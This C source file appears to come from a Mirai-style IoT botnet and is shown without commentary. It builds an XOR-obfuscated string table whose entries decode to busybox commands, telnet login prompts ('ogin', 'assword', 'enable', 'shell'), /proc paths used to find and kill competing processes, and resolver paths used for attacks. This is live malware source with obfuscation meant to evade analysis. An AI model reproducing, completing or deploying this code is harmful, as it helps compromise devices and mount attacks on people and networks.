#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xbaadf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    // /bin/sh: ./a.out: not found
    add_entry(TABLE_EXEC_SUCCESS, "\xC5\x88\x83\x84\xC5\x99\x82\xD0\xCA\xC4\xC5\x8B\xC4\x85\x9F\x9E\xD0\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 28);
   
    add_entry(TABLE_SCAN_SHELL, "\x99\x82\x8F\x86\x86\xEA", 6); 
    add_entry(TABLE_SCAN_ENABLE, "\x8F\x84\x8B\x88\x86\x8F\xEA", 7); 
    add_entry(TABLE_SCAN_SYSTEM, "\x99\x93\x99\x9E\x8F\x87\xEA", 7); 
    add_entry(TABLE_SCAN_SH, "\x99\x82\xEA", 3); 
    add_entry(TABLE_SCAN_QUERY, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\xB9\xB9\xA2\xEA", 17); 
    add_entry(TABLE_SCAN_RESP, "\x89\x85\x86\x9E\x8B\xD0\xCA\x8B\x9A\x9A\x86\x8F\x9E\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 24); 
    add_entry(TABLE_SCAN_NCORRECT, "\x84\x89\x85\x98\x98\x8F\x89\x9E\xEA", 9); 
    add_entry(TABLE_SCAN_PS, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\x9A\x99\xEA", 16); 
    add_entry(TABLE_SCAN_KILL_9, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\x81\x83\x86\x86\xCA\xC7\xD3\xEA", 22); 
    add_entry(TABLE_SCAN_OGIN, "\x85\x8D\x83\x84\xEA", 5); 
    add_entry(TABLE_SCAN_ENTER, "\x8F\x84\x9E\x8F\x98\xEA", 6); 
    add_entry(TABLE_SCAN_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8); 

    add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7); 
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5); 
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4); 
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6); 
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14); 

    add_entry(TABLE_RANDOM, "\xDB\xD8\xD9\xDE\xDF\xDC\xDD\xD2\xD3\x9B\x9D\x8F\x98\x9E\x93\x9F\x83\x85\x9A\x86\x81\x80\x82\x8D\x8C\x8E\x99\x8B\x90\x92\x89\x9C\x88\x84\x87\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xEA", 48); 
    add_entry(TABLE_ATK_RESOLVER, "\xC5\x8F\x9E\x89\xC5\x98\x8F\x99\x85\x86\x9C\xC4\x89\x85\x84\x8C\xEA", 17); 
    add_entry(TABLE_ATK_NSERV, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA", 11); 
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("dbg: Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("dbg: Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("dbg: Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}